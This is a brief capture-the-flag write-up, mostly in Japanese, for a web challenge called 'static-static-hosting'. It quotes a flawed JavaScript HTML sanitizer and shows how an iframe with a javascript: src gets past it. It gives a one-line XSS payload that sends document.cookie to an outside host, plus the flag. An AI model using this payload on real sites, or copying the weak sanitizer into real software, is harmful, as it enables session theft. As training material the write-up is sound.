# static-static-hosting (220 solves/ 435 points)

> Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me here
> Site: ...
> Note: The site is entirely static. Dirbuster will not be useful in solving it.

## solution

XSSを回避する方法が異なるだけで基本的なことはstatic-pastebinと同じ。

入力された文字列を表示する前に以下の処理が行われている

```javascript
function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

`src, width, height, alt, class`以外の属性は削除され、scriptタグも削除される。
しかし、iframeタグを使うことができるので`<iframe src="javascript:window.location.href='https://example.com/?'+document.cookie>"`を入力してやれば良い。
あとはstatic-pastebinと同じようにadminにURLを踏ませればフラグが手に入る

```
flag{wh0_n33d5_d0mpur1fy}
```
